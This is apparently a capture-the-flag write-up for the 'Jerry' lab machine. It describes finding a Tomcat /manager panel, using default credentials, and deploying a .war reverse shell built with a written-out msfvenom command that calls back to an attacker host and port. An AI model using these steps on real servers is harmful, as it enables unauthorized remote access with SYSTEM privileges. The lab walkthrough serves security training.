# Jerry

### Reconnaissance

- port 8080/tcp HTTP Apache Tomcat/Coyote JSP engine 1.1

Directory enumeration with gobuster shows an admin panel /manager with a login input.

Bad logins lead to a page disclosing the actual login information, a default credential pair for Tomcat

### Exploitation

Access to the /manager panel allows us to upload a .war reverse shell

`msfvenom java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o shell.war`

Upload the shell and deploy it, then navigate to the new endpoint with a listener ready to gain a reverse 
shell

### Privilege Escalation

The server is running as SYSTEM so we have root access 
